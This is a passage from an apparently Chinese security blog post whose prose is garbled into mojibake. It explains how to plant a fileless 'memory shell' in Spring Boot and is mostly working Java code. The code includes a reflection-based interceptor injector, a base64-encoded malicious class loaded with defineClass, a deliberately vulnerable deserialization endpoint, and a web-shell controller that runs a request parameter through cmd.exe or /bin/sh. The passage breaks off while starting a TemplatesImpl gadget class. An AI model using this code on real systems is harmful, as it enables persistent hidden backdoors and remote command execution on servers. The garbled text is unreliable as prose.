src="https://cdn.clown2024.cn/image-20241113213755407.png" alt="image-20241113213755407"></p><p>é‚£å°±çœ‹çœ‹è¿™ä¸ªmappedHandleræ˜¯æ€ä¹ˆç”Ÿæˆçš„</p><p><img src="https://cdn.clown2024.cn/image-20241113213924826.png" alt="image-20241113213924826"></p><p>åœ¨doDispatchæ–¹æ³•å‰é¢æœ‰ä¸€ä¸ªgetHandleræ–¹æ³•ï¼Œç„¶åä¼ å…¥ä¸€ä¸ªRequestFacadeå®ä¾‹processedRequestï¼Œè¿™ä¸ªprocessedRequestæ˜¯å‰é¢checkMultipartæ–¹æ³•æ£€æŸ¥ä¸€ä¸‹ï¼Œè¯¥æ–¹æ³•ä¸»è¦åˆ¤æ–­requestæ˜¯å¦ä¸ºæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œä¸æ˜¯çš„è¯åˆ™ä¼šåŸæ ·è¿”å›</p><p>è·Ÿè¿›å»getHandler</p><p><img src="https://cdn.clown2024.cn/image-20241113214501797.png" alt="image-20241113214501797"></p><p>ç„¶åå°±æ˜¯éå†æ¯ä¸€ä¸ªHandlerMappingï¼Œç„¶åä»ä¸­å–å¾—HandlerExecutionChainå®ä¾‹ï¼Œå¦‚æœèƒ½æ‰¾åˆ°è¯·æ±‚å¯¹åº”çš„Handlerå°±è¿”å›ï¼Œç»§ç»­è·Ÿè¿›ï¼Œè°ƒç”¨äº†AbstractHandlerMapping#getHandleræ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241113215756803.png" alt="image-20241113215756803"></p><p>è¿™é‡Œé¦–å…ˆè·å¾—ä¸€ä¸ªhandlerï¼Œç„¶åè°ƒç”¨getHandlerExecutionChainè¿”å›äº†ä¸€ä¸ªHandlerExecutionChainå®ä¾‹executionChainï¼Œçœ‹çœ‹è¿™ä¸ªæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241113215627045.png" alt="image-20241113215627045"></p><p>é‡Œé¢æ˜¾ç¤ºnewäº†ä¸€ä¸ªHandlerExecutionChainï¼Œç„¶åéå†adaptedInterceptorsé‡Œçš„interceptoræ·»åŠ è¿›å»ä»–çš„interceptorListé‡Œé¢</p><p><img src="https://cdn.clown2024.cn/image-20241113215958004.png" alt="image-20241113215958004"></p><p>interceptoræœ‰å¦‚ä¸‹çš„è¿™ä¸‰ç§</p><p><img src="https://cdn.clown2024.cn/image-20241113220049185.png" alt="image-20241113220049185"></p><p>å†å¾€ä¸‹ä»–å°±ç›´æ¥è¿”å›äº†è¿™ä¸ªexecutionChain</p><p><img src="https://cdn.clown2024.cn/image-20241113220218053.png" alt="image-20241113220218053"></p><p>ç„¶åè¿”å›çš„handlerä¹Ÿæ˜¯è¿™ä¸ª</p><p><img src="https://cdn.clown2024.cn/image-20241113220259687.png" alt="image-20241113220259687"></p><p>ç„¶åæœ€ç»ˆæ‰§è¡Œå°±æ˜¯æˆ‘ä»¬å‰é¢è¯´çš„é‚£ä¸ªapplyPreHandleæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241113220624107.png" alt="image-20241113220624107"></p><p>é‡Œé¢éå†äº†æ¯ä¸ªinterprectorç„¶åè¿›è¡Œè°ƒç”¨</p><p>é‚£ç°åœ¨æˆ‘ä»¬å°±çŸ¥é“åº”è¯¥åœ¨å“ªé‡Œæ’å…¥æˆ‘ä»¬çš„interceptoräº†</p><h2 id="å†…å­˜é©¬å®ç°"><a href="#å†…å­˜é©¬å®ç°-1" class="headerlink" title="å†…å­˜é©¬å®ç°"></a>å†…å­˜é©¬å®ç°</h2><p>æ ¹æ®å‰é¢çš„åˆ†ææ‰€æœ‰çš„interceptoræ˜¯å­˜åœ¨adaptedInterceptorsé‡Œé¢ï¼Œè¿™ä¸ªå±æ€§åœ¨org.springframework.web.servlet.handler.AbstractHandlerMappingé‡Œé¢</p><p><img src="https://cdn.clown2024.cn/image-20241113221751279.png" alt="image-20241113221751279"></p><p>æ‰€ä»¥æ€è·¯å°±æ˜¯åå°„è·å–åˆ°è¿™ä¸ªå˜é‡ï¼Œç„¶åæ·»åŠ æˆ‘ä»¬è‡ªå·±çš„æ¶æ„interceptorå³å¯</p><p>ç¼–å†™çš„interceptorè¿˜æ˜¯ç”¨æˆ‘ä»¬ä¸€å¼€å§‹çš„é‚£ä¸ªTestInterceptorï¼Œç°åœ¨å…ˆä¸æŠŠä»–åŠ å…¥é…ç½®ï¼Œæˆ‘ä»¬ç­‰ä¼šæ‰‹åŠ¨åŠ å…¥</p><p>ç„¶åç¼–å†™å†…å­˜é©¬ä»£ç çš„æ­¥éª¤</p><ul><li>é¦–å…ˆè·å–åº”ç”¨çš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œä¹Ÿå°±æ˜¯<code>ApplicationContext</code></li><li>ç„¶åä» <code>ApplicationContext</code> ä¸­è·å– <code>AbstractHandlerMapping</code> å®ä¾‹ï¼ˆç”¨äºåå°„ï¼‰ï¼Œä¹Ÿæœ‰æ–‡ç« ç›´æ¥è·å–RequestMappingHandlerMappingä¹Ÿå¯ä»¥ï¼Œä¸‹é¢å†™çš„å°±æ˜¯ç”¨çš„è¿™ä¸ª</li><li>åå°„è·å– <code>AbstractHandlerMapping</code>ç±»çš„ <code>adaptedInterceptors</code>å­—æ®µ</li><li>é€šè¿‡ <code>adaptedInterceptors</code>æ³¨å†Œæ‹¦æˆªå™¨</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.clown.springbootmemoryshell.interceptor.TestInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddInterceptor</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/interceptor&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">addInterceptor</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">//        AbstractHandlerMapping mappingHandlerMapping = context.getBean(AbstractHandlerMapping.class);</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">TestInterceptor</span> <span class="hljs-variable">evilInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestInterceptor</span>();<br>        adaptInterceptors.add(evilInterceptor);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Interceptor added!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è®¿é—®interceptorè¿™ä¸ªè·¯ç”±å°±ä¼šæˆåŠŸæ³¨å†Œæˆ‘ä»¬çš„interceptor</p><p><img src="https://cdn.clown2024.cn/image-20241113224259546.png" alt="image-20241113224259546"></p><p><img src="https://cdn.clown2024.cn/image-20241113224312450.png" alt="image-20241113224312450"></p><p>è¿™é‡Œçš„å®ç°ä¹Ÿå¯ä»¥æ”¹ä¸€ä¸‹ï¼Œæ”¹æˆå‰é¢Controllerçš„base64çš„å½¢å¼ï¼Œè¿™æ ·å°±ä¸éœ€è¦æœåŠ¡å™¨æœ‰å¯¹åº”çš„ç±»äº†</p><p>ä¿®æ”¹åçš„exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddInterceptor</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/interceptor&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">addInterceptor</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><span class="hljs-comment">//        AbstractHandlerMapping mappingHandlerMapping = context.getBean(AbstractHandlerMapping.class);</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQArAoAKABeCABFCwBfAGALAGEAYggAYwoAZABlCgALAGYIAGcKAAsAaAcAaQcAaggAawgAbAoACgBtCABuCABvCgAKAHAKAAoAcQcAcgcAcwoAdAB1CgAUAHYKABMAdwgAeAcAeQoAGQBeCgATAHoKABkAewgAfAoAGQB9CQBkAH4KAH8AgAoAgQCACgCBAIIKAIEAgwcAhAsAKQCFCwApAIYHAIcHAIgHAIkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAPUxvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcjsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAFyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAHcmVzdWx0cwEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABGNvZGUBAA1TdGFja01hcFRhYmxlBwBqBwCKBwBpBwCHBwCLBwCMBwCIBwCNBwByBwB5BwCEAQAKRXhjZXB0aW9ucwEAEE1ldGhvZFBhcmFtZXRlcnMBAApwb3N0SGFuZGxlAQCSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7KVYBAAxtb2RlbEFuZFZpZXcBAC5Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7AQAPYWZ0ZXJDb21wbGV0aW9uAQB5KExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL0V4Y2VwdGlvbjspVgEAAmV4AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAKU291cmNlRmlsZQEAFFRlc3RJbnRlcmNlcHRvci5qYXZhDAAqACsHAIsMAI4AjwcAjAwAkACRAQAHb3MubmFtZQcAkgwAkwCPDACUAJUBAAN3aW4MAJYAlwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACoAmAEACS9iaW4vYmFzaAEAAi1jDACZAJoMAJsAnAEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwCNDACdAJ4MACoAnwwAKgCgAQAAAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAKEAlQwAogCjAQACDQoMAKQAlQwApQCmBwCnDACoAKkHAIoMAKoAKwwAqwArAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAVABVDABYAFkBADtvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcgEAEGphdmEvbGFuZy9PYmplY3QBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABFqYXZhL2xhbmcvUHJvY2VzcwEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQATcmVkaXJlY3RFcnJvclN0cmVhbQEAHShaKUxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgEABWZsdXNoAQAFY2xvc2UAIQAnACgAAQApAAAABAABACoAKwABACwAAAAvAAEAAQAAAAUqtwABsQAAAAIALQAAAAYAAQAAAAwALgAAAAwAAQAAAAUALwAwAAAAAQAxADIAAwAsAAACJwAGAAsAAADcKxICuQADAgA6BBkExgDOLLkABAEAOgUSBbgABrYABxIItgAJmQAiuwAKWQa9AAtZAxIMU1kEEg1TWQUZBFO3AA46BqcAH7sAClkGvQALWQMSD1NZBBIQU1kFGQRTtwAOOgYZBgS2ABFXGQa2ABI6B7sAE1m7ABRZGQe2ABW3ABa3ABc6CBIYOgm7ABlZtwAaOgoZCLYAG1k6CcYAIBkKuwAZWbcAGhkJtgAcEh22ABy2AB62ABxXp//bsgAfGQq2ACAZBRkKtgAhGQW2ACIZBbYAI6cABToFA6wErAABAA8A0wDWACQAAwAtAAAAVgAVAAAADwAKABAADwASABcAFAAnABUARgAXAGIAGQBpABoAcAAbAIUAHACJAB0AkgAeAJ0AHwC6ACEAwgAiAMkAIwDOACQA0wAmANYAJQDYACcA2gApAC4AAAB6AAwAQwADADMANAAGABcAvAA1ADYABQBiAHEAMwA0AAYAcABjADcAOAAHAIUATgA5ADoACACJAEoAOwA8AAkAkgBBAD0APgAKAAAA3AAvADAAAAAAANwAPwBAAAEAAADcAEEAQgACAAAA3ABDAEQAAwAKANIARQA8AAQARgAAAFUAB/0ARgcARwcASPwAGwcASf8ALwALBwBKBwBLBwBMBwBNBwBHBwBIBwBJBwBOBwBPBwBHBwBQAAAn/wAbAAUHAEoHAEsHAEwHAE0HAEcAAQcAUQEBAFIAAAAEAAEAJABTAAAADQMAPwAAAEEAAABDAAAAAQBUAFUAAwAsAAAAYAAFAAUAAAAKKissLRkEtwAlsQAAAAIALQAAAAoAAgAAAC4ACQAvAC4AAAA0AAUAAAAKAC8AMAAAAAAACgA/AEAAAQAAAAoAQQBCAAIAAAAKAEMARAADAAAACgBWAFcABABSAAAABAABACQAUwAAABEEAD8AAABBAAAAQwAAAFYAAAABAFgAWQADACwAAABgAAUABQAAAAoqKywtGQS3ACaxAAAAAgAtAAAACgACAAAAMwAJADQALgAAADQABQAAAAoALwAwAAAAAAAKAD8AQAABAAAACgBBAEIAAgAAAAoAQwBEAAMAAAAKAFoAWwAEAFIAAAAEAAEAJABTAAAAEQQAPwAAAEEAAABDAAAAWgAAAAEAXAAAAAIAXQ==&quot;</span>;<br>        <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>        java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>        m.setAccessible(<span class="hljs-literal">true</span>);<br>        Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.interceptor.TestInterceptor&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>        Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>        <span class="hljs-type">HandlerInterceptor</span> <span class="hljs-variable">evilInterceptor</span> <span class="hljs-operator">=</span> (HandlerInterceptor) constructor.newInstance();<br>        System.out.println(<span class="hljs-string">&quot;Instance created: &quot;</span> + evilInterceptor);<br><span class="hljs-comment">//        TestInterceptor evilInterceptor = new TestInterceptor();</span><br>        adaptInterceptors.add(evilInterceptor);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Interceptor added!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="å®æˆ˜ä¸­ååºåˆ—åŒ–åˆ©ç”¨å†…å­˜é©¬"><a href="#å®æˆ˜ä¸­ååºåˆ—åŒ–åˆ©ç”¨å†…å­˜é©¬" class="headerlink" title="å®æˆ˜ä¸­ååºåˆ—åŒ–åˆ©ç”¨å†…å­˜é©¬"></a>å®æˆ˜ä¸­ååºåˆ—åŒ–åˆ©ç”¨å†…å­˜é©¬</h1><p>å‰é¢çš„å†™æ³•è¿˜ä¸èƒ½æ»¡è¶³å®æˆ˜åˆ©ç”¨ï¼Œå®æˆ˜ä¸­é€šå¸¸ç»“åˆååºåˆ—åŒ–çš„å½¢å¼ï¼Œä¸è¿‡æ”¹æˆå®æˆ˜åˆ©ç”¨ä¹Ÿè›®ç®€å•çš„ï¼Œå°±æ˜¯ç»“åˆé“¾å­æ¯”å¦‚TemplatesImplé‡Œçš„æ¶æ„ç±»ä»£ç å°±æ˜¯æˆ‘ä»¬å‰é¢æ‰€å†™çš„çš„æ¶æ„ä»£ç </p><p>å…ˆå†™ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ–æ¼æ´çš„è·¯ç”±</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnContorller</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(value = &#123;&quot;/des&quot;&#125;, method = &#123;RequestMethod.POST&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;base64Data&quot;)</span> String base64Data)</span> &#123;<br>        System.out.println(base64Data);<br>        <span class="hljs-type">byte</span>[] serializedData = Base64.getMimeDecoder().decode(base64Data);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">option</span> <span class="hljs-operator">=</span> deserializeData(serializedData);<br>        <span class="hljs-keyword">return</span> option;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">deserializeData</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] serializedData)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(serializedData);<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bis);<br>            ois.readObject();<br>            ois.close();<br>            bis.close();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ååºåˆ—åŒ–åˆ©ç”¨controller"><a href="#ååºåˆ—åŒ–åˆ©ç”¨Controller" class="headerlink" title="ååºåˆ—åŒ–åˆ©ç”¨Controller"></a>ååºåˆ—åŒ–åˆ©ç”¨Controller</h2><p>æˆ‘ä»¬è¦æ³¨å†Œçš„controller</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br><br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(p.start().getInputStream())).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next() : o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯TemplatesImplæ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> 